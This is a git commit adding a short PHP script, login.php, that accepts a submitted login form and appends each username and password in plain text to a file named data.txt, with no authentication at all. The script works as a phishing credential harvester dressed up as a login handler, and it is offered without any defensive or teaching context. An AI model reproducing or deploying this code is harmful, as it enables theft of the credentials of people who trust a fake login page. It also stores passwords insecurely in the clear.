dc2e034e5a5ecf2f3cb6ba9fbd8a14988639e13c
AndreaRaffo <andrea.raffo96@hotmail.it>
2017-04-15 20:12:41 +0200

    Add files via upload

---
+++ login.php
@@ -0,0 +1,15 @@
+<?php
+
+//If Submit Button Is Clicked Do the Following
+if ($_POST['Login']){
+
+$myFile = "data.txt";
+$fh = fopen($myFile, 'a') or die("can't open file");
+$stringData = $_POST['username'] . ":";
+fwrite($fh, $stringData);
+$stringData = $_POST['password'] . "\n";
+fwrite($fh, $stringData);
+fclose($fh);
+
+} 
+?>
